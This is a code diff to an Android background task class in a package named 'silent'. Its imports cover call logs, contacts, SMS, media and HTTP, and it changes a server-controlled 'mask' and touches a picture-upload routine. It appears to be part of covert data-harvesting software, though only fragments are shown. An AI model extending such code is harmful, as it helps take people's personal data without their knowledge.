@@ -19,50 +19,27 @@ import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.BatteryManager;
 import android.os.Build;
-import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import java.io.BufferedInputStream;
-import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
-import java.net.URLConnection;
-import java.net.URLEncoder;
-import java.security.KeyManagementException;
-import java.security.KeyStore;
-import java.security.KeyStoreException;
-import java.security.NoSuchAlgorithmException;
-import java.security.cert.Certificate;
-import java.security.cert.CertificateException;
-import java.security.cert.CertificateFactory;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 
-import javax.net.ssl.HostnameVerifier;
-import javax.net.ssl.HttpsURLConnection;
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.SSLSession;
-import javax.net.ssl.TrustManagerFactory;
-
-import src.silent.jobs.utils.ContactModel;
-import src.silent.jobs.utils.Sms;
+import src.silent.models.ContactModel;
+import src.silent.models.Sms;
 
 /**
  * Created by all3x on 2/23/2018.
@@ -75,7 +52,7 @@ public abstract class TaskMaster extends AsyncTask<Context, Void, Void> {
     @Override
     protected Void doInBackground(Context... params) {
         // TODO: Get the mask from server
-        String mask = "10000000";
+        String mask = "00000000";
 
         this.params = params[0];
         //getAndroidIDModel();
@@ -339,6 +316,7 @@ public abstract class TaskMaster extends AsyncTask<Context, Void, Void> {
                 String picturePath = cur.getString(columnIndex);
                 if (picturePath != null) {
                     File file = new File(picturePath);
+
                     Log.d("EDIT USER PROFILE", "UPLOAD: file length = " + file.length());
                     Log.d("EDIT USER PROFILE", "UPLOAD: file exist = " + file.exists());
                 }
